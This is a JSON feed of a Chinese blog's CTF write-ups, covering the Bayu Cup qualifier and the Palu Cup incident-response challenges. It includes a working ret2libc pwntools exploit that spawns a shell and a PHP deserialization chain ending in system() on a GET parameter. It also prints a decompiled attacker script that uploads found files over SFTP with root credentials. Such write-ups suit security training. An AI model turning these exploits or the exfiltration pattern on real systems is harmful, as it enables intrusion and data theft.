{
    "version": "https://jsonfeed.org/version/1",
    "title": "ililiiY • All posts by \"比赛\" tag",
    "description": "承蒙的是希望 做出你想做的",
    "home_page_url": "https://lookhui.github.io",
    "items": [
        {
            "id": "https://lookhui.github.io/%E5%B7%B4%E6%B8%9D%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/",
            "url": "https://lookhui.github.io/%E5%B7%B4%E6%B8%9D%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/",
            "title": "巴渝杯初赛wp",
            "date_published": "2024-04-24T03:53:34.000Z",
            "content_html": "<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h2>\n<p>Check</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/mhJiORPWHvVF1t7.png\" alt=\"image-20240424155721348\" /></p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> crypto</h2>\n<h4 id=\"get-the-ciphertext\"><a class=\"anchor\" href=\"#get-the-ciphertext\">#</a> Get the ciphertext</h4>\n<p>Ook 和 Brainfuck 解码</p>\n<p fd62371a16e34b4236af4c815c70d2c2=\"\">flag</p>\n<h4 id=\"银行卡\"><a class=\"anchor\" href=\"#银行卡\">#</a> 银行卡</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import gmpy2</span><br><span class=\"line\">from Crypto.Util.number import long_to_bytes</span><br><span class=\"line\"></span><br><span class=\"line\">nspan><br><span class=\"line\">e1=806324329</span><br><span class=\"line\">e2=981665371</span><br><span class=\"line\">cspan><br><span class=\"line\">cspan><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def exp_def(e1,e2,c1,c2,n):</span><br><span class=\"line\"></span><br><span class=\"line\">    s,s1,s2 = gmpy2.gcdext(e1, e2)</span><br><span class=\"line\"></span><br><span class=\"line\">    m = (pow(c1,s1,n) * pow(c2 ,s2 ,n)) % n</span><br><span class=\"line\"></span><br><span class=\"line\">    return int(m)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">m=exp_def(e1,e2,c1,c2,n)</span><br><span class=\"line\"></span><br><span class=\"line\">print(long_to_bytes(m))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> pwn</h2>\n<p>很平常的 ret2libc 平常环境打不进去</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context.log_level = &quot;debug&quot;</span><br><span class=\"line\">program = &quot;ret2libc&quot;</span><br><span class=\"line\">p = remote(&quot;node.nsctf.cn&quot;,56526)#</span><br><span class=\"line\"># p=process(program)</span><br><span class=\"line\">elf = ELF(program)</span><br><span class=\"line\">puts_plt = elf.plt[&quot;puts&quot;]</span><br><span class=\"line\">puts_got = elf.got[&quot;puts&quot;]</span><br><span class=\"line\">libc=ELF(&quot;libc6_2.23-0ubuntu11.3_amd64.so&quot;, checksec = False)</span><br><span class=\"line\">pop_rdi = 0x0000000000400763</span><br><span class=\"line\">pop_ret = 0x0000000000400509</span><br><span class=\"line\">__start = 0x00000000004006A9</span><br><span class=\"line\">payload = b&#x27;a&#x27;*(0x40+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(__start) #//跳转到rdi寄存器上面然后在通过puts函数来打印puts的got在通过ret到起始位置让下面的payload生效</span><br><span class=\"line\">p.sendlineafter(b&quot;want\\n&quot;,payload)</span><br><span class=\"line\">puts_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\">log.info(&#x27;puts addr is %x&#x27;%puts_addr)</span><br><span class=\"line\">libc_base = puts_addr - libc.sym[b&#x27;puts&#x27;]</span><br><span class=\"line\">system = libc_base + libc.symbols[b&#x27;system&#x27;]</span><br><span class=\"line\">bin_sh_str= libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class=\"line\">log.info(&#x27;libc addr is %x&#x27;%libc_base)</span><br><span class=\"line\">log.info(&#x27;bin_sh_str is %x&#x27;%bin_sh_str)</span><br><span class=\"line\">payload2 = b&#x27;a&#x27;*(0x40+8)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh_str)+p64(system)</span><br><span class=\"line\">p.sendlineafter(&quot;want&quot;,payload2)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"re\"><a class=\"anchor\" href=\"#re\">#</a> re</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># p= &#123; 102, 109, 99, 100, 127, 100, 117, 99, 110, 86, 110, 106, 96, 126, 101, 101, 79, 112, 126, 119, 103, 126, 124, 113, 116, 100 &#125;</span><br><span class=\"line\">p=[102, 109, 99, 100, 127, </span><br><span class=\"line\">                 100, 117, 99, 110, 86, </span><br><span class=\"line\">                 110, 106, 96, 126, 101, </span><br><span class=\"line\">                 101, 79, 112, 126, 119, </span><br><span class=\"line\">                 103, 126, 124, 113, 116, </span><br><span class=\"line\">                 100 ]</span><br><span class=\"line\">ebx=0</span><br><span class=\"line\">for i in range(len(p)):</span><br><span class=\"line\">\tp[i]^=ebx</span><br><span class=\"line\">\tebx+=1</span><br><span class=\"line\">p=[chr(i) for i in p]</span><br><span class=\"line\">print(p)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> misc</h2>\n<h4 id=\"流量分析\"><a class=\"anchor\" href=\"#流量分析\">#</a> 流量分析</h4>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/p2cdJTZgVGDq6zm.jpg\" alt=\"img\" /></p>\n<p>第 289 条</p>\n<p>直接 base64 解密</p>\n<h4 id=\"20201118_zip\"><a class=\"anchor\" href=\"#20201118_zip\">#</a> 20201118_zip</h4>\n<p>伪加密打开后一个提示一个 zip</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/gQnmPBaei4wHG6d.jpg\" alt=\"img\" /></p>\n<p>告诉我们 11 位密码开头 186，猜测是手机号码纯数字</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/EVsLW7jZNgu3rIy.jpg\" alt=\"img\" /> 最后一个 crc 一样明文爆破</p>\n",
            "tags": [
                "比赛"
            ]
        },
        {
            "id": "https://lookhui.github.io/%E5%B8%95%E9%B2%81%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/",
            "url": "https://lookhui.github.io/%E5%B8%95%E9%B2%81%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/",
            "title": "帕鲁杯",
            "date_published": "2024-04-22T07:56:46.000Z",
            "content_html": "<h1 id=\"帕鲁应急响应ctf\"><a class=\"anchor\" href=\"#帕鲁应急响应ctf\">#</a> 帕鲁应急响应 ctf</h1>\n<h2 id=\"应急响应\"><a class=\"anchor\" href=\"#应急响应\">#</a> 应急响应</h2>\n<p>解压密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Network@@ZGSF&amp;One-FoxSelfTeam</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-1\"><a class=\"anchor\" href=\"#应急响应-1\">#</a> 应急响应 - 1</h3>\n<p>首先打开除了 pc 机外的靶机设置 net 模式后按照要求去访问 jump 靶机</p>\n<p>打开标签处得到第一个 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[BrYeaVj54009rDIZzu4O]</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/JAUZG4MhmaDX6Hn.png\" alt=\"image-20240419094415298\" /></p>\n<h3 id=\"应急响应-2\"><a class=\"anchor\" href=\"#应急响应-2\">#</a> 应急响应 - 2</h3>\n<p>jump 上查看</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/aRcW4PFBOxwCsVG.jpg\" alt=\"img\" /></p>\n<h3 id=\"应急响应-3\"><a class=\"anchor\" href=\"#应急响应-3\">#</a> 应急响应 - 3</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">192.168.1.4</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-4\"><a class=\"anchor\" href=\"#应急响应-4\">#</a> 应急响应 - 4</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CVE-2024-29201</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-5\"><a class=\"anchor\" href=\"#应急响应-5\">#</a> 应急响应 - 5</h3>\n<p>就在 root 文件夹下</p>\n<h3 id=\"应急响应-6\"><a class=\"anchor\" href=\"#应急响应-6\">#</a> 应急响应 - 6</h3>\n<p>home 使用 python 写的还原即可得到账号密码</p>\n<h3 id=\"应急响应-7\"><a class=\"anchor\" href=\"#应急响应-7\">#</a> 应急响应 - 7</h3>\n<p>8080</p>\n<h3 id=\"应急响应-8\"><a class=\"anchor\" href=\"#应急响应-8\">#</a> 应急响应 - 8</h3>\n<p>/api/system</p>\n<h3 id=\"应急响应-9\"><a class=\"anchor\" href=\"#应急响应-9\">#</a> 应急响应 - 9</h3>\n<p>在 /flask/log.txt/log.txt</p>\n<p>下面有一个反弹 dns</p>\n<h3 id=\"应急响应-10\"><a class=\"anchor\" href=\"#应急响应-10\">#</a> 应急响应 - 10</h3>\n<p>是时间戳转换一下</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/kMzpHsY8VwQgm6v.png\" alt=\"image-20240421210914004\" /></p>\n<h3 id=\"应急响应-11\"><a class=\"anchor\" href=\"#应急响应-11\">#</a> 应急响应 - 11</h3>\n<p>python</p>\n<h3 id=\"应急响应-12\"><a class=\"anchor\" href=\"#应急响应-12\">#</a> 应急响应 - 12</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">192.168.20.123</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-13\"><a class=\"anchor\" href=\"#应急响应-13\">#</a> 应急响应 - 13</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">palu.com</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-14\"><a class=\"anchor\" href=\"#应急响应-14\">#</a> 应急响应 - 14</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5(123123)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-15没有搞出\"><a class=\"anchor\" href=\"#应急响应-15没有搞出\">#</a> 应急响应 - 15 (没有搞出)</h3>\n<p>我在 waf 看了半天也没有看到到底是多少条</p>\n<h3 id=\"应急响应-16\"><a class=\"anchor\" href=\"#应急响应-16\">#</a> 应急响应 - 16</h3>\n<p>在 nginx 目录下</p>\n<p>有一个 hack 文本</p>\n<h3 id=\"应急响应-17\"><a class=\"anchor\" href=\"#应急响应-17\">#</a> 应急响应 - 17</h3>\n<p>在 bin 下的 helloworld 就是后门文件</p>\n<h3 id=\"应急响应-18\"><a class=\"anchor\" href=\"#应急响应-18\">#</a> 应急响应 - 18</h3>\n<p>看那个都很像但是只有</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">begingame才算</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-19\"><a class=\"anchor\" href=\"#应急响应-19\">#</a> 应急响应 - 19</h3>\n<p>看时间能看出注册了 10 个使用账号密码登录到网站后台</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin</span><br><span class=\"line\">Network@2020</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-20\"><a class=\"anchor\" href=\"#应急响应-20\">#</a> 应急响应 - 20</h3>\n<p>waf 里面</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2024-04-16 21:03:46</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-21\"><a class=\"anchor\" href=\"#应急响应-21\">#</a> 应急响应 - 21</h3>\n<p>下载的文件是 upload.zip</p>\n<h3 id=\"应急响应-22\"><a class=\"anchor\" href=\"#应急响应-22\">#</a> 应急响应 - 22</h3>\n<p>使用 palu.com 进入 webserver 服务器</p>\n<p>然后使用 sudo su 得到 root 权限</p>\n<p>查看 apache 日志即可得到</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/2LaQSczITGbljqn.png\" alt=\"image-20240421212104133\" /></p>\n<p>在扫描时把 upload.zip 给扫描下来了</p>\n<h3 id=\"应急响应-23\"><a class=\"anchor\" href=\"#应急响应-23\">#</a> 应急响应 - 23</h3>\n<p>在 /var/www/html/api 目录下</p>\n<h3 id=\"应急响应-24\"><a class=\"anchor\" href=\"#应急响应-24\">#</a> 应急响应 - 24</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nidewen</span><br></pre></td></tr></table></figure></p>\n<p>就是文件名</p>\n<h3 id=\"应急响应-25\"><a class=\"anchor\" href=\"#应急响应-25\">#</a> 应急响应 - 25</h3>\n<p>登录 PC1 查看本地用户，发现 hacker 可疑账号</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/m6rqkHKVgfvTo4M.png\" alt=\"image-20240421212736577\" /></p>\n<h3 id=\"应急响应-26\"><a class=\"anchor\" href=\"#应急响应-26\">#</a> 应急响应 - 26</h3>\n<p>查看 hacker 的详细信息可以知道到期时间：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/BvakIHPQjo718uK.png\" alt=\"image-20240421212757620\" /></p>\n<h3 id=\"应急响应-27\"><a class=\"anchor\" href=\"#应急响应-27\">#</a> [应急响应 - 27]</h3>\n<p>提取 PC1 上的 raw.raw 文件到 volatility 分析：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/Iuyb261Z3Jo9FXh.jpg\" alt=\"Snipaste_2024-04-19_20-16-19\" /></p>\n<p>从 Suggested 可知镜像文件可能为 Win7SP1x64, 再查看进程</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/c5yholQms4JpitA.jpg\" alt=\"Snipaste_2024-04-19_20-19-14\" /></p>\n<h3 id=\"应急响应-28\"><a class=\"anchor\" href=\"#应急响应-28\">#</a> 应急响应 - 28</h3>\n<p>这个一开始我是真的随便一下就出了，直接 notepad++ 打开查找 username</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/mzuKPk4ofxSbqvn.png\" alt=\"image-20240419194656616\" /></p>\n<h3 id=\"应急响应-29\"><a class=\"anchor\" href=\"#应急响应-29\">#</a> 应急响应 - 29</h3>\n<p>使用 volatility 获取剪切板内容即可得到</p>\n<p>吐槽：我搞半天没有想到这个题竟然是之前信息安全管理与评估的原题</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/21/TFmUIBW6RlSADX2.jpg\" alt=\"img\" /></p>\n<h3 id=\"应急响应-30没有搞出\"><a class=\"anchor\" href=\"#应急响应-30没有搞出\">#</a> 应急响应 - 30 (没有搞出)</h3>\n<p>看了半天没有搞出来什么命令都试了把 contart 都导出来了但是还是没有得到地址</p>\n<h3 id=\"应急响应-31\"><a class=\"anchor\" href=\"#应急响应-31\">#</a> 应急响应 - 31</h3>\n<p>在登陆 PC2 的时候会弹出 artifact.exe 程序很可疑查看它的 SHA256、MD5 值，发现 MD5 值是我们要的值：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/nxugAwGvPI615fa.png\" alt=\"image-20240421213234540\" /></p>\n<h3 id=\"应急响应-32\"><a class=\"anchor\" href=\"#应急响应-32\">#</a> 应急响应 - 32</h3>\n<h3 id=\"应急响应-33\"><a class=\"anchor\" href=\"#应急响应-33\">#</a> 应急响应 - 33</h3>\n<p>扫描工具 fscan</p>\n<p>可以在 jump 里面看 webserver 执行的命令直接看到</p>\n<h3 id=\"应急响应-34\"><a class=\"anchor\" href=\"#应急响应-34\">#</a> 应急响应 - 34</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">123</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-35\"><a class=\"anchor\" href=\"#应急响应-35\">#</a> 应急响应 - 35</h3>\n<p>去数据库硬翻的</p>\n<h3 id=\"image-20240419181351855\"><a class=\"anchor\" href=\"#image-20240419181351855\">#</a> <img data-src=\"https://s2.loli.net/2024/04/26/8vAk697aFbB1iUV.png\" alt=\"image-20240419181351855\" /></h3>\n<h3 id=\"应急响应-36\"><a class=\"anchor\" href=\"#应急响应-36\">#</a> 应急响应 - 36</h3>\n<p>在监控服务器上翻到的</p>\n<h3 id=\"应急响应-37没有做出\"><a class=\"anchor\" href=\"#应急响应-37没有做出\">#</a> 应急响应 - 37 (没有做出)</h3>\n<p>没有翻到</p>\n<h3 id=\"应急响应-38\"><a class=\"anchor\" href=\"#应急响应-38\">#</a> 应急响应 - 38</h3>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/Wx1bYhj9SUv6rN3.png\" alt=\"image-20240421211039583\" /></p>\n<h3 id=\"应急响应-39\"><a class=\"anchor\" href=\"#应急响应-39\">#</a> 应急响应 - 39</h3>\n<p>在 pc2 里面就能看到</p>\n<p>可以在 pc2 里面搜索或者在堡垒机上查看 pc2 看视频也能知道</p>\n<h3 id=\"应急响应-40没有做出\"><a class=\"anchor\" href=\"#应急响应-40没有做出\">#</a> 应急响应 - 40 (没有做出)</h3>\n<h3 id=\"应急响应-41\"><a class=\"anchor\" href=\"#应急响应-41\">#</a> 应急响应 - 41</h3>\n<p>陈琚鹭</p>\n<h3 id=\"应急响应-42\"><a class=\"anchor\" href=\"#应急响应-42\">#</a> 应急响应 - 42</h3>\n<p>在注册表中写了一串 flag</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/pyMU6CnR4w8JdL1.png\" alt=\"image-20240421215006138\" /></p>\n<h3 id=\"应急响应-43\"><a class=\"anchor\" href=\"#应急响应-43\">#</a> 应急响应 - 43</h3>\n<p>md5（49）</p>\n<h3 id=\"应急响应-44\"><a class=\"anchor\" href=\"#应急响应-44\">#</a> 应急响应 - 44</h3>\n<p>堡垒机视频里面能够看到</p>\n<p>创建的是</p>\n<p>Network@2020</p>\n<h3 id=\"应急响应-45\"><a class=\"anchor\" href=\"#应急响应-45\">#</a> 应急响应 - 45</h3>\n<p>encode.txt</p>\n<h3 id=\"应急响应-46\"><a class=\"anchor\" href=\"#应急响应-46\">#</a> 应急响应 - 46</h3>\n<p>和密码那个题一样</p>\n<p>Chrome 浏览器搜索关键词发现有一款免杀程序用了这个编码：</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/2kSTIqNXBy9tgPD.png\" alt=\"image-20240421215239368\" /></p>\n<h3 id=\"应急响应-47\"><a class=\"anchor\" href=\"#应急响应-47\">#</a> 应急响应 - 47</h3>\n<h3 id=\"应急响应-48\"><a class=\"anchor\" href=\"#应急响应-48\">#</a> 应急响应 - 48</h3>\n<p>palucomeyi1.exe</p>\n<h3 id=\"应急响应-49\"><a class=\"anchor\" href=\"#应急响应-49\">#</a> 应急响应 - 49</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import paramiko</span><br><span class=\"line\">from getpass import getpass</span><br><span class=\"line\"></span><br><span class=\"line\">def search_in_files(directory, search_text):</span><br><span class=\"line\">Unsupported opcode: BEGIN_FINALLY</span><br><span class=\"line\">    pass</span><br><span class=\"line\"># WARNING: Decompyle incomplete</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def ssh(local_file_path, remote_file_path):</span><br><span class=\"line\">    hostname = &#x27;192.168.20.123&#x27;</span><br><span class=\"line\">    port = 22</span><br><span class=\"line\">    username = &#x27;root&#x27;</span><br><span class=\"line\">    password = &#x27;Network@2020&#x27;</span><br><span class=\"line\">    client = paramiko.SSHClient()</span><br><span class=\"line\">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class=\"line\">    client.connect(hostname, port, username, password)</span><br><span class=\"line\">    sftp = client.open_sftp()</span><br><span class=\"line\">    sftp.put(local_file_path, remote_file_path)</span><br><span class=\"line\">    sftp.close()</span><br><span class=\"line\">    client.close()</span><br><span class=\"line\">    print(f&#x27;&#x27;&#x27;File &#123;local_file_path&#125; uploaded to &#123;remote_file_path&#125; on &#123;hostname&#125;&#x27;&#x27;&#x27;)</span><br><span class=\"line\">    flag = &#x27;flag&#123;234567uyhgn_aiduyai&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">search_directory = &#x27;/&#x27;</span><br><span class=\"line\">search_for_text = &#x27;passwod&#x27;</span><br><span class=\"line\">(a, b) = search_in_files(search_directory, search_for_text)</span><br><span class=\"line\">ssh(a, b)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-50\"><a class=\"anchor\" href=\"#应急响应-50\">#</a> 应急响应 - 50</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;234567uyhgn_aiduyai&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-51\"><a class=\"anchor\" href=\"#应急响应-51\">#</a> 应急响应 - 51</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">passwod</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"应急响应-52爆破半天跑不出来\"><a class=\"anchor\" href=\"#应急响应-52爆破半天跑不出来\">#</a> 应急响应 - 52 (爆破半天跑不出来)</h3>\n<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> web</h2>\n<h3 id=\"r23\"><a class=\"anchor\" href=\"#r23\">#</a> r23</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class a&#123;</span><br><span class=\"line\">    public function __get($a)&#123;</span><br><span class=\"line\">        $this-&gt;b-&gt;love();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class b&#123;</span><br><span class=\"line\">    public function __destruct()&#123;</span><br><span class=\"line\">        $tmp = $this-&gt;c-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public function __wakeup()&#123;</span><br><span class=\"line\">        $this-&gt;c = &quot;no!&quot;;</span><br><span class=\"line\">        $this-&gt;b = $this-&gt;a;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class xk&#123;</span><br><span class=\"line\">    public function love()&#123;</span><br><span class=\"line\">       system($_GET[&#x27;a&#x27;]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a[&#x27;1&#x27;] = new b();</span><br><span class=\"line\">$a[&#x27;2&#x27;] = new b();</span><br><span class=\"line\">$a[&#x27;2&#x27;]-&gt;b = &amp;$a[&#x27;2&#x27;]-&gt;c;</span><br><span class=\"line\">$a[&#x27;2&#x27;]-&gt;a = new a();</span><br><span class=\"line\">$a[&#x27;2&#x27;]-&gt;a-&gt;b = new xk();</span><br><span class=\"line\">echo serialize($a);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"web-签到\"><a class=\"anchor\" href=\"#web-签到\">#</a> Web - 签到</h3>\n<p>下载源码，</p>\n<p>很简单直接访问自己的 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/flag</span><br></pre></td></tr></table></figure></p>\n<p>即可</p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> crypto</h2>\n<h3 id=\"玛卡巴卡能有什么坏心思呢\"><a class=\"anchor\" href=\"#玛卡巴卡能有什么坏心思呢\">#</a> 玛卡巴卡能有什么坏心思呢</h3>\n<p><a href=\"https://www.ddosi.org/drt-aav/\"><em>https://www.ddosi.org/drt-aav/</em></a> 去这个网站找字典</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/s5iom17b2BEcJOa.png\" alt=\"标题: fig:\" /></p>\n<p>encoding_rules = {<br />\n'a': ' 玛卡巴卡轰 ',<br />\n'b': ' 阿巴雅卡轰 ',<br />\n'c': ' 伊卡阿卡噢轰 ',<br />\n'd': ' 哈姆达姆阿卡嗙轰 ',<br />\n'e': ' 咿呀呦轰 ',<br />\n'f': ' 玛卡雅卡轰 ',<br />\n'g': ' 伊卡阿卡轰 ',<br />\n'h': ' 咿呀巴卡轰 ',<br />\n'i': ' 达姆阿卡嗙轰 ',<br />\n'j': ' 玛卡巴卡玛卡巴卡轰 ',<br />\n'k': ' 玛卡巴卡玛卡巴卡玛卡巴卡轰 ',<br />\n'l': ' 玛卡巴卡玛卡巴卡玛卡巴卡玛卡巴卡轰 ',<br />\n'm': ' 阿巴雅卡阿巴雅卡轰 ',<br />\n'n': ' 阿巴雅卡阿巴雅卡阿巴雅卡轰 